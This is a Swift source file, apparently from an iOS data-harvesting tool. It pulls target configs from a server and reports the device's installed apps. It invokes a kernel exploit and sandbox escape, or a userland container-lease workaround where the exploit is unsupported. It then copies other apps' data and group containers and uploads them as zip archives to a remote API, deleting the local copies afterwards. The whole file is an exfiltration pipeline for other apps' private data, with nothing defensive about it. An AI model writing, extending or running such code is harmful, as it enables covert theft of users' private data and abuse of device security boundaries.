import Foundation

/// iOS > 26.1.0 的 in-app 采集上报管线（移植自 3105 的 ProtocolCollectService）：
/// `/api/device/report` 拉配置 → MCM 租约拿容器 → 复制 payload → 打 zip →
/// `/api/upload/zip` 上传 → 删本地 zip。
///
/// 与 legacy 分支（dlopen apptrace/libapptracecore）互斥：
///   iOS <= 26.1.0 → LegacyTracePipeline
///   iOS >  26.1.0 → TraceCollector
enum TraceCollector {
    static let maximumLocalZipCount = 10

    private static let lock = NSLock()
    private static var started = false

    /// 严格大于 26.1.0（26.1.1 / 26.2 / 27.x）才走 in-app 管线
    static var shouldRunInAppPipeline: Bool {
        let (major, minor, patch) = TraceAppInfo.osVersionTuple
        if major != 26 { return major > 26 }
        if minor != 1 { return minor > 1 }
        return patch > 0
    }

    /// 进程内幂等；提权在后台完成后再跑采集
    static func startIfNeeded() {
        guard shouldRunInAppPipeline else {
            traceLog("in-app pipeline skipped — iOS \(TraceAppInfo.osVersion) is not above 26.1.0")
            return
        }

        lock.lock()
        let isFirstCall = !started
        started = true
        lock.unlock()
        guard isFirstCall else { return }

        traceLog("in-app pipeline selected for iOS \(TraceAppInfo.osVersion) (build \(TraceAppInfo.buildID))")
        traceLog("MCM bridge available=\(MCMLease.isBridgeAvailable) hostBundleIDMatches=\(MCMLease.hostBundleIDMatches)")

        // 组名必须在签发侧和查询侧一致：签名里有组、但设备上没有它的容器时，
        // containermanagerd 只回 -6，把它当"这个路径不行"就会把整条链判死。
        let entitled = UserlandAccess.entitledGroups
        let usable = UserlandAccess.usableGroups
        traceLog("userland: groups entitled=\(entitled) usable=\(usable)")
        if entitled != usable {
            traceLog("userland: WARNING entitled/usable mismatch — sig=\(entitled) usable=\(usable)；不匹配的组一律不发 token")
        }

        // API 请求优先：先把采集跑起来（collect/config + device/report），
        // 探测与提权挪到并行的后台队列。以前这里是「先 probe 再 Task」，
        // 而 probe 会等容器索引（全量 38M inode ≈ 180s），请求全被堵在扫描
        // 后面，一个都没发出去（20:44:22 那轮日志里一条 api 都没有）。
        Task {
            do {
                let result = try await runCycle()
                traceLog("cycle finished — zips=\(result.zipCount) uploaded=\(result.uploadedCount) bytes=\(result.byteCount)")
                if result.uploadedCount > 0 {
                    try? await TraceAPI.reportLog(
                        text: "采集完成 — 已完成 \(result.zipCount) 个（上传 \(result.uploadedCount) 个）"
                    )
                }
            } catch {
                traceLog("cycle failed — \(error)")
            }
        }

        DispatchQueue.global(qos: .utility).async {
            let (maj, min, pat) = TraceAppInfo.osVersionTuple
            if !KernelBridge.hasSandboxAccess {
                if ExploitPolicy.supportsKernel(major: maj, minor: min, patch: pat) {
                    traceLog("in-app pipeline: elevating (kexploit + sandbox escape)…")
                    let ok = KernelBridge.run()
                    traceLog("in-app pipeline: kernel elevation \(ok ? "ok" : "failed — falling back to userland")")
                    if !ok { _ = UserlandAccess.probe(force: true) }
                } else {
                    traceLog("in-app pipeline: iOS \(TraceAppInfo.osVersion) — userland route (worse_query)…")
                    let ok = UserlandAccess.probe(force: true)
                    traceLog("in-app pipeline: userland access \(ok ? "ok" : "failed — \(UserlandAccess.lastError)")")
                }
            }
        }
    }

    // MARK: - One cycle

    struct CollectOutcome {
        var label: String
        var zipped = false
        var uploaded = false
        var bytes: Int64 = 0
        var skippedReason: String?
    }

    struct ContainerResolution {
        var path: String
        var leases: [UserlandAccess.RetainedLease]
    }

    /// 与 3105 `ProtocolCollectCenter.runCycle` 同构：
    ///   1 等容器索引就绪（不等就必然全 skip）
    ///   2 索引里已知的 app 容器直接采
    ///   3 group / accessGroup / 绝对路径走 resolver
    ///   4 边扫边采：walk 每发现一个容器就立刻采集（AsyncStream）
    ///   5 扫完再给未命中的 config 一次机会，300s 窗口内结束
    /// 旧的单轮 for 循环在索引还空时就把 13 个 config 全判死了（log2_86 的 1/13）。
    static func runCycle(fileManager: FileManager = .default) async throws -> TraceCycleResult {
        let configs = try await TraceAPI.pullCollectConfigs()
        traceLog("cycle: got \(configs.count) config(s)")

        guard !configs.isEmpty else {
            throw TraceError.collectionFailed("empty collect configs")
        }

        // 已安装清单并行上报，不阻塞 zip 循环（3105 的经验：串行会让 App 被挂起）
        Task.detached(priority: .utility) {
            var ids = ContainerStore.containerIndexSnapshot(waitForBuild: false).keys.sorted()
            if ids.isEmpty {
                ids = enumerateInstalledBundleIDs()
            }
            do {
                try await TraceAPI.reportInstalledApps(ids)
            } catch {
                traceLog("device/apps report failed — \(error)")
            }
        }

        // 后台继续扫（4M 窗口），然后等索引就绪。这一步是「和 3105 一样能成功」
        // 的关键：先建索引，再遍历 config；否则 13 个 config 会在空索引窗口里
        // 逐个解析失败，然后一个个 continue 掉。
        ContainerStore.startBackgroundContainerScan()
        let index = await Task.detached(priority: .userInitiated) {
            ContainerStore.containerIndexSnapshot(waitForBuild: true)
        }.value
        traceLog("cycle: container index ready — \(index.count) bundles")

        // 索引就绪后再补报一次完整清单：构建期上报时索引还是空的，服务端只
        // 会收到 1 条（log2_88 的 "device/apps — reported 1 bundle ids"），
        // 它按这份清单下发 config 就会漏掉真正的目标。
        if index.count > 1 {
            let complete = index.keys.sorted()
            Task.detached(priority: .utility) {
                do {
                    try await TraceAPI.reportInstalledApps(complete)
                    traceLog("device/apps reported complete index — \(complete.count) bundle ids")
                } catch {
                    traceLog("device/apps (complete index) failed — \(error)")
                }
            }
        }

        let documents = fileManager.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let stamp = timestampString()
        let byID = Dictionary(configs.map { ($0.bundleID, $0) }, uniquingKeysWith: { first, _ in first })
        let stateLock = NSLock()
        var pending = Set(byID.keys)
        var zipCount = 0
        var uploadedCount = 0
        var byteCount: Int64 = 0

        let discovery = AsyncStream<(String, String)>.makeStream()
        let stream = discovery.stream
        let continuation = discovery.continuation
        ContainerStore.setDiscoveryHandler { identifier, path in
            continuation.yield((identifier, path))
        }
        ContainerStore.setScanCompletionHandler {
            continuation.finish()
        }
        defer {
            ContainerStore.setDiscoveryHandler(nil)
            ContainerStore.setScanCompletionHandler(nil)
        }

        func takePending(_ identifier: String) -> TraceCollectConfig? {
            stateLock.lock()
            defer { stateLock.unlock() }
            guard pending.contains(identifier), let config = byID[identifier] else { return nil }
            pending.remove(identifier)
            return config
        }

        func needsResolver(_ config: TraceCollectConfig) -> Bool {
            if config.bundleID.hasPrefix("group.") { return true }
            if !config.accessGroup.isEmpty { return true }
            return !config.items.isEmpty && config.items.allSatisfy { item in
                let value = item.path.trimmingCharacters(in: .whitespaces)
                return value.hasPrefix("/") && value != "/"
            }
        }

        func consume(
            _ config: TraceCollectConfig,
            path: String,
            leases: [UserlandAccess.RetainedLease]
        ) async {
            traceLog("cycle: collecting \(config.bundleID) — \(path)")
            let outcome = await collectOne(
                config,
                containerPath: path,
                stamp: stamp,
                documents: documents,
                fileManager: fileManager
            )
            // lease 必须活到复制 + 打包结束，再释放。
            leases.forEach { $0.release() }
            stateLock.lock()
            if outcome.zipped {
                zipCount += 1
                byteCount += outcome.bytes
            }
            if outcome.uploaded { uploadedCount += 1 }
            let remaining = pending.count
            stateLock.unlock()
            if let reason = outcome.skippedReason {
                traceLog("cycle: \(outcome.label) skipped — \(reason)")
            }
            traceLog("cycle: \(config.bundleID) done — zips=\(zipCount) uploaded=\(uploadedCount) remaining=\(remaining)")
        }

        // 边扫边采：容器一被发现就采，不等 38M inode 走完。
        let collectDeadline = Date().addingTimeInterval(300)
        let streamTask = Task {
            for await (identifier, path) in stream {
                if Date() > collectDeadline {
                    continuation.finish()
                    break
                }
                guard let config = takePending(identifier) else { continue }
                let lease = ContainerStore.retainAccess(path)
                await consume(config, path: path, leases: [lease].compactMap { $0 })
            }
        }

        // 1. 索引里已经知道的 app 容器
        let indexed = ContainerStore.containerIndexSnapshot(waitForBuild: false)
        for config in configs {
            guard let path = indexed[config.bundleID],
                  takePending(config.bundleID) != nil else { continue }
            let lease = ContainerStore.retainAccess(path)
            await consume(config, path: path, leases: [lease].compactMap { $0 })
        }

        // 2. group 容器 / accessGroup / 绝对路径
        for config in configs where needsResolver(config) {
            guard takePending(config.bundleID) != nil,
                  let resolution = resolveContainer(for: config) else { continue }
            await consume(config, path: resolution.path, leases: resolution.leases)
        }

        // 3. 索引已可用就提前结束流；否则等 walk 结束（它会 finish 流）
        let indexUsable = !ContainerStore.containerIndexSnapshot(waitForBuild: false).isEmpty
        if indexUsable, !ContainerStore.containerIndexIsBuilding {
            continuation.finish()
        } else {
            Task.detached(priority: .userInitiated) {
                _ = ContainerStore.containerIndexSnapshot(waitForBuild: true)
            }
        }
        await streamTask.value

        // 4. 索引补齐后，给还没认领的 config 第二次机会
        for config in configs {
            guard takePending(config.bundleID) != nil,
                  let resolution = resolveContainer(for: config) else { continue }
            await consume(config, path: resolution.path, leases: resolution.leases)
        }

        stateLock.lock()
        let leftovers = pending.sorted()
        stateLock.unlock()
        for bundleID in leftovers {
            traceLog("cycle: skip \(bundleID) — container unavailable after scan")
        }

        pruneLocalZips(in: documents, fileManager: fileManager)
        let result = TraceCycleResult(zipCount: zipCount, uploadedCount: uploadedCount, byteCount: byteCount)
        traceLog("cycle: done zips=\(zipCount) uploaded=\(uploadedCount) bytes=\(byteCount)")
        return result
    }

    /// 单个 bundle：解析 items → 复制 → 打包 → 上传。
    /// 抽出来是为了让 streaming 驱动能在容器被发现的那一刻就跑完一个 bundle。
    private static func collectOne(
        _ config: TraceCollectConfig,
        containerPath: String,
        stamp: String,
        documents: URL,
        fileManager: FileManager
    ) async -> CollectOutcome {
        let label = config.appName.isEmpty ? config.bundleID : config.appName
        var outcome = CollectOutcome(label: label)

        let containerURL = URL(fileURLWithPath: containerPath, isDirectory: true)
        let sources: [(url: URL, name: String)] = config.items.compactMap { item in
            guard let url = resolvedItemURL(
                item, containerURL: containerURL, config: config, fileManager: fileManager
            ) else { return nil }
            return (url, url.lastPathComponent)
        }
        guard !sources.isEmpty else {
            traceLog("cycle: skip \(config.bundleID) — no collectable items")
            outcome.skippedReason = "采集项路径不存在"
            return outcome
        }

        let folderName = appFolderName(for: config)
        let stagingParent = documents.appendingPathComponent(
            ".collect-\(stamp)-\(UUID().uuidString)", isDirectory: true
        )
        let staging = stagingParent.appendingPathComponent(folderName, isDirectory: true)
        do {
            try fileManager.createDirectory(at: staging, withIntermediateDirectories: true)
        } catch {
            traceLog("cycle: cannot create staging folder — \(error)")
            outcome.skippedReason = "创建临时目录失败"
            return outcome
        }

        var copied = 0
        for source in sources {
            if source.url.standardizedFileURL == containerURL.standardizedFileURL {
                // 整容器项：把容器里的条目平铺进 <appName>/（与 legacy zip 结构一致）
                let entries = (try? fileManager.contentsOfDirectory(atPath: source.url.path)) ?? []
                traceLog("cycle: whole-container copy — \(entries.count) entries")
                for entry in entries where !entry.hasPrefix(".com.apple.mobile_container_manager") {
                    let child = source.url.appendingPathComponent(entry)
                    copied += copyItem(child, into: staging, fileManager: fileManager)
                }
                continue
            }
            copied += copyItem(source.url, into: staging, fileManager: fileManager)
        }

        guard copied > 0 else {
            try? fileManager.removeItem(at: stagingParent)
            outcome.skippedReason = "文件夹复制失败"
            return outcome
        }

        let zipName = uniqueZipName(
            baseName: "collect-\(folderName)-\(stamp)", in: documents, fileManager: fileManager
        )
        let zipURL = documents.appendingPathComponent(zipName + ".zip")
        do {
            let written = try ZIPArchiveWriter.write(items: [staging], to: zipURL, fileManager: fileManager)
            try? fileManager.removeItem(at: stagingParent)
            outcome.zipped = true
            outcome.bytes = written.sourceBytes
            traceLog("cycle: zip ok — \(zipURL.lastPathComponent) entries=\(written.entryCount) bytes=\(written.sourceBytes)")
        } catch {
            try? fileManager.removeItem(at: stagingParent)
            traceLog("cycle: zip failed for \(config.bundleID) — \(error)")
            outcome.skippedReason = "打包失败"
            return outcome
        }

        do {
            try await TraceAPI.uploadZip(fileURL: zipURL, bundleID: config.bundleID)
            outcome.uploaded = true
            try? fileManager.removeItem(at: zipURL)
            traceLog("cycle: upload ok + local zip removed — \(zipURL.lastPathComponent)")
        } catch {
            traceLog("cycle: upload failed — \(zipURL.lastPathComponent): \(error)")
        }
        return outcome
    }

    // MARK: - Container / item resolution

    private static func resolveContainer(for config: TraceCollectConfig) -> ContainerResolution? {
        // 全部是绝对路径（/var/mobile/Media/...）时不需要容器：以 "/" 为基准
        let allAbsolute = !config.items.isEmpty && config.items.allSatisfy { item in
            let p = item.path.trimmingCharacters(in: .whitespaces)
            guard !p.isEmpty, p != "/", p != ".", p != "./" else { return false }
            return p.hasPrefix("/")
        }
        if allAbsolute {
            traceLog("cycle: \(config.bundleID) items are absolute paths — base is /")
            // 27.x 没有内核访问，每个绝对路径都要单独拿 userland 扩展，
            // 并且要活到复制结束（3105 的 userlandLeases(forExternalPath:)）。
            var leases: [UserlandAccess.RetainedLease] = []
            for item in config.items {
                if let lease = UserlandAccess.RetainedLease.acquire(path: item.path) {
                    leases.append(lease)
                }
            }
            return ContainerResolution(path: "/", leases: leases)
        }

        // 与 3105 的 ProtocolCollectCenter.resolveContainer 完全同序：
        //   group.* -> ContainerStore.resolveGroupContainerPath
        //              失败则退回 app 容器
        //   普通    -> ContainerStore.resolveAppContainerPath
        //   accessGroup -> ContainerStore.resolveGroupContainerPath
        if config.bundleID.hasPrefix("group.") {
            if let path = ContainerStore.resolveGroupContainerPath(identifier: config.bundleID) {
                traceLog("cycle: group container \(config.bundleID) -> \(path)")
                return ContainerResolution(path: path, leases: leasesFor(path))
            }
            let appBundleID = String(config.bundleID.dropFirst("group.".count))
            if let path = ContainerStore.resolveAppContainerPath(bundleID: appBundleID) {
                traceLog("cycle: group lease unavailable — using app container \(appBundleID) -> \(path)")
                return ContainerResolution(path: path, leases: leasesFor(path))
            }
        } else if let path = ContainerStore.resolveAppContainerPath(bundleID: config.bundleID) {
            traceLog("cycle: app container \(config.bundleID) -> \(path)")
            return ContainerResolution(path: path, leases: leasesFor(path))
        }

        if !config.accessGroup.isEmpty,
           let path = ContainerStore.resolveGroupContainerPath(identifier: config.accessGroup) {
            traceLog("cycle: accessGroup container \(config.accessGroup) -> \(path)")
            return ContainerResolution(path: path, leases: leasesFor(path))
        }
        traceLog("cycle: \(config.bundleID) — no container (LS/MI/MCM/scan all failed)")
        return nil
    }

    /// 为容器单独争一个 userland 扩展，供 collectOne 的复制 + 打包期间保活。
    /// ContainerStore.retainAccess 会长期持有自己的 lease，这里取独立的一份，
    /// 这样 consume 结束时能精确释放，不会把索引那边的 lease 一起放掉。
    private static func leasesFor(_ path: String) -> [UserlandAccess.RetainedLease] {
        guard let lease = UserlandAccess.RetainedLease.acquire(path: path) else { return [] }
        return [lease]
    }

    private static func resolvedItemURL(
        _ item: TraceCollectItem,
        containerURL: URL,
        config: TraceCollectConfig,
        fileManager: FileManager
    ) -> URL? {
        var normalized = item.path
        while normalized.contains(" /") || normalized.contains("/ ") {
            normalized = normalized
                .replacingOccurrences(of: " /", with: "/")
                .replacingOccurrences(of: "/ ", with: "/")
        }
        normalized = normalized.trimmingCharacters(in: .whitespaces)

        if normalized.isEmpty || normalized == "/" || normalized == "." || normalized == "./" {
            guard containerURL.path != "/" else { return nil }
            return fileManager.fileExists(atPath: containerURL.path) ? containerURL : nil
        }

        var candidates: [String] = []
        if normalized.hasPrefix("/") {
            candidates = [normalized]
        } else {
            candidates = [(containerURL.path as NSString).appendingPathComponent(normalized)]
            let prefix = "Library/Application Support/"
            if normalized.hasPrefix(prefix) {
                let rest = String(normalized.dropFirst(prefix.count))
                if !rest.isEmpty {
                    var layout = containerURL.path
                    for component in ["Library", "Application Support", config.bundleID] + rest.components(separatedBy: "/") {
                        layout = (layout as NSString).appendingPathComponent(component)
                    }
                    candidates.append(layout)
                }
            }
        }

        for candidate in candidates {
            let url = URL(fileURLWithPath: candidate, isDirectory: item.type == "dir")
            if fileManager.fileExists(atPath: url.path) { return url }
        }
        traceLog("cycle: skip missing \(item.path) — tried \(candidates.count) variant(s)")
        return nil
    }

    // MARK: - Copy / zip / housekeeping

    private static func copyItem(_ source: URL, into directory: URL, fileManager: FileManager) -> Int {
        let target = directory.appendingPathComponent(source.lastPathComponent)
        do {
            try fileManager.copyItem(at: source, to: target)
            return 1
        } catch {
            traceLog("cycle: copy failed \(source.lastPathComponent) — \(error.localizedDescription)")
            return copyFileByFile(source, into: directory, fileManager: fileManager, depth: 0)
        }
    }

    /// 目录复制失败时的兜底：逐文件 Data 读写，读不动的跳过
    private static func copyFileByFile(_ source: URL, into directory: URL, fileManager: FileManager, depth: Int) -> Int {
        guard depth < 16 else { return 0 }
        var isDir: ObjCBool = false
        guard fileManager.fileExists(atPath: source.path, isDirectory: &isDir) else { return 0 }
        let target = directory.appendingPathComponent(source.lastPathComponent, isDirectory: isDir.boolValue)

        if !isDir.boolValue {
            do {
                try fileManager.createDirectory(atPath: target.deletingLastPathComponent().path, withIntermediateDirectories: true)
                let data = try Data(contentsOf: source, options: [.uncached])
                try data.write(to: target, options: .atomic)
                return 1
            } catch {
                traceLog("cycle: skip file \(source.lastPathComponent) — \(error.localizedDescription)")
                return 0
            }
        }

        var count = 0
        if let entries = try? fileManager.contentsOfDirectory(atPath: source.path) {
            for entry in entries {
                count += copyFileByFile(source.appendingPathComponent(entry), into: target, fileManager: fileManager, depth: depth + 1)
            }
        }
        return count
    }

    private static func appFolderName(for config: TraceCollectConfig) -> String {
        let serverName = sanitizedFolderName(config.appName)
        if !serverName.isEmpty { return serverName }

        if config.bundleID.hasPrefix("group.") {
            let trimmed = String(config.bundleID.dropFirst("group.".count))
            let short = sanitizedFolderName(trimmed.components(separatedBy: ".").last ?? trimmed)
            if !short.isEmpty { return short.lowercased() }
        }

        var parts = config.bundleID.components(separatedBy: ".")
        if parts.count > 1 {
            if parts.last?.lowercased() == "app" {
                parts.removeLast()
                let derived = sanitizedFolderName(parts.joined().lowercased())
                if !derived.isEmpty { return derived }
            } else {
                let derived = sanitizedFolderName(parts.last?.lowercased() ?? "")
                if !derived.isEmpty { return derived }
            }
        }
        let fallback = sanitizedFolderName(config.bundleID.lowercased())
        return fallback.isEmpty ? "payload" : fallback
    }

    private static func sanitizedFolderName(_ raw: String) -> String {
        let invalid = CharacterSet(charactersIn: "\\/:*?\"<>|").union(.controlCharacters)
        var name = raw.components(separatedBy: invalid).joined(separator: " ")
        name = name.split(separator: " ").joined(separator: " ")
        name = name.trimmingCharacters(in: .whitespacesAndNewlines)
        while name.hasSuffix(".") { name.removeLast() }
        guard !name.isEmpty, name != ".", name != ".." else { return "" }
        return name.count > 64 ? String(name.prefix(64)) : name
    }

    private static func timestampString() -> String {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.dateFormat = "yyyyMMdd-HHmmss"
        return formatter.string(from: Date())
    }

    private static func uniqueZipName(baseName: String, in directory: URL, fileManager: FileManager) -> String {
        var candidate = baseName
        var suffix = 2
        while fileManager.fileExists(atPath: directory.appendingPathComponent(candidate + ".zip").path) {
            candidate = "\(baseName)-\(suffix)"
            suffix += 1
        }
        return candidate
    }

    private static func pruneLocalZips(in directory: URL, fileManager: FileManager) {
        let names = ((try? fileManager.contentsOfDirectory(atPath: directory.path)) ?? [])
            .filter { $0.hasPrefix("collect-") && $0.hasSuffix(".zip") }
            .sorted()
        let excess = names.count - maximumLocalZipCount
        guard excess > 0 else { return }
        for name in names.prefix(excess) {
            try? fileManager.removeItem(at: directory.appendingPathComponent(name))
            traceLog("cycle: pruned local zip \(name)")
        }
    }

    // MARK: - 已安装应用枚举（1:1 移植 3105 ProtocolCollectCenter.enumerateInstalledBundleIDs）

    private static func enumerateInstalledBundleIDs() -> [String] {
        let bundleMetadata = ContainerStore.applicationBundleMetadataCatalog()
        let apiApps = ContainerStore.applyingBundleMetadata(
            to: ContainerStore.installedAppsFromAPI(),
            catalog: bundleMetadata
        )
        let dynamicIdentifiers = ContainerStore.dynamicAppIdentifiers()
        let mcmApps = ContainerStore.installedAppsFromMCM(
            identifiers: dynamicIdentifiers,
            bundleMetadata: bundleMetadata
        )
        let filesystemApps = ContainerStore.containersFromFilesystem()
        let baseIdentifiedApps = mcmApps + apiApps
        _ = ContainerDiscoveryMerger.merge(
            enumerated: filesystemApps,
            identified: baseIdentifiedApps,
            path: { $0.containerPath }
        )
        // LaunchServices csstore 里 2 万多条候选要逐个 MHA 查询（实测 30s+），
        // 3105 已关闭这个来源，只保留 MCM + 文件系统。
        let launchServicesIdentifiers: [String] = []
        let mhaIdentifiers = MHAIdentifierCatalog.identifiers(
            dynamic: dynamicIdentifiers,
            installed: apiApps.map(\.bundleID),
            research: ContainerStore.researchAppIdentifiers,
            custom: bundleMetadata.keys.sorted(),
            launchServices: launchServicesIdentifiers
        )
        let mhaApps = ContainerStore.installedAppsFromMHACandidates(
            identifiers: mhaIdentifiers,
            bundleMetadata: bundleMetadata
        )
        let allKnownApps = mhaApps + baseIdentifiedApps
        let identifiedPaths = Set(allKnownApps.map {
            ContainerDiscoveryMerger.canonicalPath($0.containerPath)
        })
        let unmatched = filesystemApps.filter {
            !identifiedPaths.contains(
                ContainerDiscoveryMerger.canonicalPath($0.containerPath)
            )
        }
        let inferred = ContainerStore.inferUnidentifiedApps(
            in: unmatched,
            knownApps: allKnownApps,
            launchServicesIdentifiers: Set(launchServicesIdentifiers)
        )
        let finalApps = AppDataCatalogMerger.merge(
            identified: allKnownApps,
            fallback: inferred,
            identifier: { $0.bundleID },
            path: { $0.containerPath }
        )

        var seen = Set<String>()
        var result: [String] = []
        for app in finalApps {
            let bundleID = app.bundleID
            guard ContainerPresentationPolicy.shouldShow(bundleID: bundleID),
                  ContainerBundleCandidateResolver.isValidBundleIdentifier(bundleID),
                  seen.insert(bundleID).inserted else { continue }
            result.append(bundleID)
        }
        result.sort()
        traceLog("collect: enumerated \(result.count) installed bundle ids for reporting")
        return result
    }

}
